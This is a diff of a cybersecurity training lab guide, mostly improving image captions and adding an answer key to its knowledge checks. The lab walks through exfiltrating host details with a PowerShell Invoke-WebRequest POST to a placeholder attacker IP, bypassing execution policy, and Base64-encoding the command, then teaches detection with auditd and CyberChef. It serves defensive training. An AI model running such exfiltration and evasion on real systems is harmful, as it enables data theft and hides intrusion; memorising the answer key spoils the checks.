@@ -96,15 +96,15 @@ You will be using a basic HTTP Listener to act as your C2 system to receive the 
 
 4. (**Attack-Console**) Open a Terminal by double-clicking on the Terminal Emulator Desktop shortcut or by clicking on Terminal Emulator in the Panel.
 
-![TERM-OPEN.png](./img/TERM-OPEN.png)
+![Attack-Console desktop showing Terminal Emulator shortcut](./img/TERM-OPEN.png)
 
 5. (**Attack-Console**, **Terminal**) Navigate to the Downloads directory using the command `cd /home/user/Downloads`.
 
-![PH1-HTTP-05.png](./img/PH1-HTTP-05.png)
+![Terminal in Downloads directory after cd command](./img/PH1-HTTP-05.png)
 
 6. (**Attack-Console**, **Terminal**) Start the HTTP Listener using the command `python3 httpListener.py`. The HTTP Listener will remain active as long as the Terminal Window remains open.
 
-![PH1-HTTP-06.png](./img/PH1-HTTP-06.png)
+![Terminal running python3 httpListener.py script](./img/PH1-HTTP-06.png)
 
 | &#128736; HTTP Listener |
 |---|
@@ -112,11 +112,11 @@ You will be using a basic HTTP Listener to act as your C2 system to receive the 
 
 7. (**Attack-Console**, **Terminal**) In the Terminal menu, click on **Terminal** > **Set Title**.
 
-![PH1-HTTP-07.png](./img/PH1-HTTP-07.png)
+![Terminal menu open showing Set Title option](./img/PH1-HTTP-07.png)
 
 8. (**Attack-Console**, **Terminal**) Type "HTTP Listener" into the textbox and press Enter. This names the session "HTTP Listener" and will make it easier to locate later.
 
-![PH1-HTTP-08.png](./img/PH1-HTTP-08.png)
+![Terminal title set to “HTTP Listener”](./img/PH1-HTTP-08.png)
 
 </p>
 </details>
@@ -129,19 +129,19 @@ You will be using a basic HTTP Listener to act as your C2 system to receive the 
 
 1. From the `Attack-Console`, Open a new Terminal by double-clicking on the Terminal Emulator Desktop shortcut or by clicking on Terminal Emulator in the Panel.
 
-![TERM-OPEN.png](./img/TERM-OPEN.png)
+![Attack-Console desktop showing Terminal Emulator shortcut](./img/TERM-OPEN.png)
 
 2. (**Attack-Console**, **Terminal**) Determine the IPv4 address of `Attack-Console` by typing the command `hostname -I | awk '{print $1}'`. This IP address will be used as the target for exfiltrated data. After you have recorded the IPv4 address, you may close the Terminal Window.
 
-![PH1-EXFIL-02.png](./img/PH1-EXFIL-02.png)
+![Terminal output showing Attack-Console IPv4 address](./img/PH1-EXFIL-02.png)
 
 3. (**Attack-Console**) Open Visual Studio Code by double-clicking on the Visual Studio Code shortcut on the Desktop.
 
-![VSCODE-OPEN.png](./img/VSCODE-OPEN.png)
+![Visual Studio Code desktop shortcut](./img/VSCODE-OPEN.png)
 
 4. (**Attack-Console**, **Visual Studio Code**) In the Menu bar, click on **File** > **New Text File** to open a blank text file. You will use this text file to prepare your commands before copying them to the Terminal Emulator.
 
-![PH1-EXFIL-04.gif](./img/PH1-EXFIL-04.gif)
+![VS Code with new text file opened for script](./img/PH1-EXFIL-04.gif)
 
 5. (**Attack-Console**, **Visual Studio Code**) Copy the below PowerShell script into Visual Studio Code.
 
@@ -164,7 +164,7 @@ Invoke-WebRequest -Uri 'http://<YOUR_IP_HERE>:8080' `
 
 6. (**Attack-Console**, **Visual Studio Code**) In line 7 of the PowerShell script, replace the `<YOUR_IP_HERE>` section with the `Attack-Console`'s IP address you identified in Step 2.
 
-![PH1-EXFIL-06-IP-REPLACE](./img/PH1-EXFIL-06-IP-REPLACE.gif)
+![VS Code showing PowerShell script with IP placeholder replaced](./img/PH1-EXFIL-06-IP-REPLACE.gif)
 
 In this script, the Linux commands `hostname`, `whoami` and `hostname -I` are run to retrieve system information from the host. The values are stored in the `$info` hashtable and then converted to a JSON string.
 
@@ -174,23 +174,23 @@ The `Invoke-WebRequest` Cmdlet is used to send an HTTP request to the destinatio
 - `-Body $info` - Sends the JSON-formatted data stored in the `$info` hashtable.
 - `-ContentType 'application/json'` - Specifies that the data being sent is in JSON format.
 
-![PH1-EXFIL-06.png](./img/PH1-EXFIL-06.png)
+![Attack-Console `Invoke-WebRequest` Cmdlet](./img/PH1-EXFIL-06.png)
 
 7. (**Attack-Console**) Open a new Terminal by double-clicking on the Terminal Emulator Desktop shortcut or by clicking on Terminal Emulator in the Panel.
 
-![TERM-OPEN.png](./img/TERM-OPEN.png)
+![Attack-Console desktop showing Terminal Emulator shortcut](./img/TERM-OPEN.png)
 
 8. (**Attack-Console**, **Terminal**) In the Terminal menu, click on **Terminal** > **Set Title**.
 
-![PH1-EXFIL-08.png](./img/PH1-EXFIL-08.png)
+![Terminal menu open showing Set Title option](./img/PH1-EXFIL-08.png)
 
 9. (**Attack-Console**, **Terminal**) Type "SSH Base-Ubuntu" into the textbox and press Enter.
 
-![PH1-EXFIL-09.png](./img/PH1-EXFIL-09.png)
+![Terminal title set to "SSH Base-Ubuntu"](./img/PH1-EXFIL-09.png)
 
 10. (**Attack-Console**, **Terminal**) Use SSH to connect to the `Base-Ubuntu` server with the command `ssh user@base-ubuntu`. If asked if you want to continue connecting, type `yes` and press Enter.
 
-![PH1-EXFIL-10.png](./img/PH1-EXFIL-10.png)
+![SSH connection attempt to Base-Ubuntu system](./img/PH1-EXFIL-10.png)
 
 11. (**Attack-Console**, **Terminal**) Enter the password `tartans` and press Enter to connect.
 
@@ -199,7 +199,7 @@ The `Invoke-WebRequest` Cmdlet is used to send an HTTP request to the destinatio
 - `-NoProfile` Ensures that PowerShell starts without loading any user-specific profile scripts to improve both speed and prevent unwanted scripts from interfering.
 - `-ExecutionPolicy Bypass` Overrides the system's PowerShell script execution policy allowing the script to run regardless of restrictions. This is used to evade PowerShell security controls.
 
-![PH1-EXFIL-12.png](./img/PH1-EXFIL-12.png)
+![PowerShell session started with pwsh -NoProfile -ExecutionPolicy Bypass](./img/PH1-EXFIL-12.png)
 
 | &#129513; SO ANYONE CAN BYPASS AN EXECUTION POLICY? |
 | --- |
@@ -209,13 +209,13 @@ The `Invoke-WebRequest` Cmdlet is used to send an HTTP request to the destinatio
 
 14. (**Attack-Console**, **SSH Connection**, **PowerShell Prompt**) Paste the PowerShell script into the PowerShell prompt. Press Enter to execute the commands.
 
-![PH1-EXFIL-14.png](./img/PH1-EXFIL-14.png)
+![PowerShell prompt with exfiltration script pasted](./img/PH1-EXFIL-14.png)
 
 *Leave this Terminal and SSH session open and remain within the PowerShell prompt. We will use it again in a later step.*
 
 15. (**Attack-Console**, **Terminal**, **HTTP Listener**) Return to the Terminal Window titled "HTTP Listener". The data you just exfiltrated from `Base-Ubuntu` appears.
 
-![PH1-EXFIL-15.png](./img/PH1-EXFIL-15.png)
+![HTTP Listener terminal showing exfiltrated system data](./img/PH1-EXFIL-15.png)
 
 **Knowledge Check Question 1:** *What is the IPv4 address of base-ubuntu in the output of the http-listener.*
 
@@ -253,15 +253,15 @@ Invoke-WebRequest -Uri 'http://<YOUR_IP_HERE>:8080' -Method Post -Body `$info -C
 
 4. (**Attack-Console**, **Visual Studio Code**) In line 7 of the PowerShell script, replace the `<YOUR_IP_HERE>` section with the `Attack-Console`'s IP address you identified previously.
 
-![PH1-OBF-04](./img/PH1-OBF-04.gif)
+![VS Code showing PowerShell script with IP replaced](./img/PH1-OBF-04.gif)
 
 5. From the `Attack-Console`, open a new Terminal by double-clicking on the Terminal Emulator Desktop shortcut or by clicking on Terminal Emulator in the Panel. We won't title this Terminal since it will only be used temporarily to create the encoded command.
 
-![TERM-OPEN.png](./img/TERM-OPEN.png)
+![Attack-Console desktop showing Terminal Emulator shortcut](./img/TERM-OPEN.png)
 
 6. (**Attack-Console**, **Terminal**)  Start PowerShell with the command `pwsh`.
 
-![PH1-OBF-04.png](./img/PH1-OBF-06.png)
+![Terminal running pwsh command](./img/PH1-OBF-06.png)
 
 7. (**Attack-Console**, **PowerShell Prompt**) Copy the PowerShell script you crafted above in Step 4 from Visual Studio Code.
 
@@ -271,7 +271,7 @@ Invoke-WebRequest -Uri 'http://<YOUR_IP_HERE>:8080' -Method Post -Body `$info -C
 |---|
 | The commands being run are the same ones you executed on the remote system, but here we are storing the data in a hash table variable named `$command`. This variable will be used to convert the commands to Base64 in the following steps |
 
-![PH1-OBF-08.png](./img/PH1-OBF-08.png)
+![PowerShell prompt with script stored in $command variable](./img/PH1-OBF-08.png)
 
 9. (**Attack-Console**, **PowerShell Prompt**) Convert the contents of `$command` to a byte array using Unicode (UTF-16LE) by entering the following command into the PowerShell Prompt.
 
@@ -279,7 +279,7 @@ Invoke-WebRequest -Uri 'http://<YOUR_IP_HERE>:8080' -Method Post -Body `$info -C
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 ```
 
-![PH1-OBF-09.png](./img/PH1-OBF-09.png)
+![PowerShell prompt converting $command to Unicode byte array](./img/PH1-OBF-09.png)
 
 10. (**Attack-Console**, **PowerShell Prompt**) Take the contents of `$bytes` and convert to a Base64 string by entering the following command into the PowerShell Prompt.
 
@@ -287,7 +287,7 @@ $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
 $encodedCommand = [Convert]::ToBase64String($bytes)
 ```
 
-![PH1-OBF-10.png](./img/PH1-OBF-10.png)
+![PowerShell prompt converting byte array to Base64 string](./img/PH1-OBF-10.png)
 
 11. (**Attack-Console**, **PowerShell Prompt**) Print the Base64 encoded string stored in `$encodedCommand` to the Terminal by entering the following command into the PowerShell Prompt.
 
@@ -295,7 +295,7 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 Write-Output $encodedCommand
 ```
 
-![PH1-OBF-11.png](./img/PH1-OBF-11.png)
+![PowerShell prompt displaying Base64 encoded string](./img/PH1-OBF-11.png)
 
 12. (**Attack-Console**) Return to Visual Studio Code.
 
@@ -316,11 +316,11 @@ Write-Output $encodedCommand
 pwsh -EncodedCommand <BASE64>
 ```
 
-![PH1-OBF-17.png](./img/PH1-OBF-17.png)
+![SSH session executing pwsh -EncodedCommand <BASE64>](./img/PH1-OBF-17.png)
 
 18. (**Attack-Console**, **Terminal**, **HTTP Listener**) Return to the Terminal Window titled "HTTP Listener". The data exfiltrated from `Base-Ubuntu` appears.
 
-![PH1-OBF-18.png](./img/PH1-OBF-18.png)
+![HTTP Listener terminal showing exfiltrated system data](./img/PH1-OBF-18.png)
 
 | &#129513; KEY POINT |
 |---|
@@ -348,7 +348,7 @@ The system `Base-Ubuntu` is using the default logging enabled when Ubuntu Server
 
 4. (**Attack-Console**, **SSH Session**) Reviewing the syslog log file, note there are logs that PowerShell was starting, and it was ready for user input, but there is no record of the commands that were run. The logs also do not indicate which user started PowerShell.
 
-![PH1-LOG-06.png](./img/PH1-LOG-06.png)
+![Syslog showing PowerShell startup entry](./img/PH1-LOG-06.png)
 
 | &#129513; Understanding Default Logging in Syslog |
 | --- |
@@ -356,7 +356,7 @@ The system `Base-Ubuntu` is using the default logging enabled when Ubuntu Server
 
 6. (**Attack-Console**, **SSH Session**) Locate the Phase 1 token with the command `sudo cat /var/log/syslog | grep lab_completion`. Enter this token to advance to Phase 2 of the lab!
 
-![PH1-LOG-07.png](./img/PH1-LOG-07.png)
+![Syslog showing lab_completion token](./img/PH1-LOG-07.png)
 
 7. (**Attack-Console**, **SSH Session**) Close the "SSH Base-Ubuntu" Terminal window.
 
@@ -393,13 +393,13 @@ Audit Daemon (`auditd`) is an auditing framework for Linux that helps system adm
 
 4. (**Attack-Console**, **Terminal**) Use SSH to connect to the `Logging-Ubuntu` server with the command `ssh user@logging-ubuntu`. If asked if you want to continue connecting, type `yes` and press Enter.
 
-![PH2-AUD-02.png](./img/PH2-AUD-02.png)
+![SSH terminal connected to Logging-Ubuntu](./img/PH2-AUD-02.png)
 
 5. (**Attack-Console**, **Terminal**) Enter the password `tartans` and press Enter to connect.
 
 6. (**Attack-Console**, **SSH Session**) Create a new rules file called `powershell.rules` with the command `sudo nano /etc/audit/rules.d/powershell.rules`. If prompted, enter the `sudo` password `tartans` and press Enter.
 
-![PH2-AUD-04.png](./img/PH2-AUD-04.png)
+![Nano editor creating powershell.rules file](./img/PH2-AUD-04.png)
 
 | &#128270; INFORMATION |
 |---|
@@ -417,7 +417,7 @@ This rule will audit the execution of the PowerShell binary by tracking the `exe
 - `-F path=/opt/microsoft/powershell/7/pwsh` - Filters to include events involving the PowerShell binary
 - `-k powershell_exec` - Assigns a key to the log entry so the audit logs can be easily searched
 
-![PH2-AUD-05.png](./img/PH2-AUD-05.png)
+![Nano editor showing rule to audit PowerShell execution](./img/PH2-AUD-05.png)
 
 8. (**Attack-Console**, **SSH Session**, **Nano Editor**) Write out (save) your changes in Nano by pressing Ctrl+o.
 
@@ -433,7 +433,7 @@ This rule will audit the execution of the PowerShell binary by tracking the `exe
 
 12. (**Attack-Console**, **SSH Session**) Verify the rules were successfully added to the main rules file with the command `sudo auditctl -l`.
 
-![PH2-AUD-10g](./img/PH2-AUD-10.png)
+![auditctl -l output confirming powershell_exec rule](./img/PH2-AUD-10.png)
 
 **Knowledge Check Question 1:** *What is the full path of the PowerShell binary on the logging-ubuntu system?*
 
@@ -456,7 +456,7 @@ This rule will audit the execution of the PowerShell binary by tracking the `exe
 pwsh -EncodedCommand <BASE64>
 ```
 
-![PH2-OBF-01](./img/PH2-OBF-01.png)
+![SSH terminal running pwsh -EncodedCommand <BASE64>](./img/PH2-OBF-01.png)
 
 2. (**Attack-Console**, **SSH Session**) Search the audit logs for the key `powershell_exec` with the command.
 
@@ -464,7 +464,7 @@ pwsh -EncodedCommand <BASE64>
 sudo ausearch -k powershell_exec
 ```
 
-![PH2-OBF-02](./img/PH2-OBF-02.png)
+![SSH terminal showing ausearch log with decoded command details](./img/PH2-OBF-02.png)
 
 3. (**Attack-Console**, **SSH Session**) Compared to the syslog entry you examined at the end of Phase 1, the auditd log contains much more detail, including the command that was run (lines 19 through 25) and the user ID (uid) of the user who executed it (line 29).
 
@@ -504,7 +504,7 @@ sudo ausearch -k powershell_exec
 
 4. (**Attack-Console**, **SSH Session**) The username of the person who executed the command can be found by searching the `/etc/passwd` file for the UID with the command `cat /etc/passwd | grep 1000`.
 
-![PH2-OBF-04](./img/PH2-OBF-04.png)
+![SSH terminal showing /etc/passwd entry for UID 1000](./img/PH2-OBF-04.png)
 
 Since you ran the command, the UID traces back to the `user` user. When investigating suspicious PowerShell commands being run, being able to identify the user account is helpful to narrow your investigation.
 
@@ -538,21 +538,21 @@ In the lab environment you know the commands executed by the Base64 encoded comm
 
 3. (**Attack-Console**, **FireFox**, **CyberChef**) In the upper-right "Input" box, paste the encoded command from the log file.
 
-![PH3-CC-03](./img/PH3-CC-03.png)
+![CyberChef input box with Base64 string pasted](./img/PH3-CC-03.png)
 
 4. (**Attack-Console**, **FireFox**, **CyberChef**) In the Operations pane (on the left), drag "From Base64" to the Recipe box.
 
-![PH3-CC-04.png](./img/PH3-CC-04.png)
+![CyberChef recipe box with From Base64 operation](./img/PH3-CC-04.png)
 
 5. (**Attack-Console**, **FireFox**, **CyberChef**) In the Operations pane's search field, search for "null".
 
 6. (**Attack-Console**, **FireFox**, **CyberChef**) In the Operations pane, drag "Remove null bytes" to the recipe box.
 
-![PH3-CC-06.png](./img/PH3-CC-06.png)
+![CyberChef recipe box with Remove null bytes operation](./img/PH3-CC-06.png)
 
 7. (**Attack-Console**, **FireFox**, **CyberChef**) With the Recipe built, examine the "Output" box. This is the decoded command. Compare it to the commands you used earlier and note that they match!
 
-![PH3-CC-07.png](./img/PH3-CC-07.png)
+![CyberChef output box showing decoded PowerShell command](./img/PH3-CC-07.png)
 </p>
 </details>
 
@@ -620,3 +620,33 @@ Enabling additional logging to detect abuse of PowerShell increases the likeliho
  - <a href="https://www.cisa.gov/resources-tools/resources/identifying-and-mitigating-living-land-techniques" target="_blank">Identifying and Mitigating Living Off the Land Techniques</a>
  - <a href="https://www.cisa.gov/resources-tools/resources/federal-civilian-executive-branch-fceb-operational-cybersecurity-alignment-focal-plan" target="_blank">Federal Civilian Executive Branch (FCEB) Operational Cybersecurity Alignment (FOCAL) Plan</a>
  - <a href="https://niccs.cisa.gov/workforce-development/nice-framework" target="_blank">NICE Framework</a>
+
+</p>
+</details>
+
+
+<details>
+<summary>
+<h2>Answer Key</h2>
+</summary>
+<p>
+
+**Knowledge Check Question 1**: *What is the IPv4 address of base-ubuntu in the output of the http-listener?*
+
+- `10.1.1.151`
+
+**Knowledge Check Question 2**: *Which type of encoding did you use to obfuscate the powershell script - XOR, ROT13, or Base64?*
+
+- *Base64 | base64*
+
+**Knowledge Check Question 3**: *What is the full path of the powershell binary on the logging-ubuntu system (include the "pwsh" filename)?*
+
+- `/opt/microsoft/powershell/7/pwsh`
+
+**Knowledge Check Question 4**: *What system file contains information about a user's account (do not include the path)?*
+
+- *passwd*
+
+</p>
+</details>
+
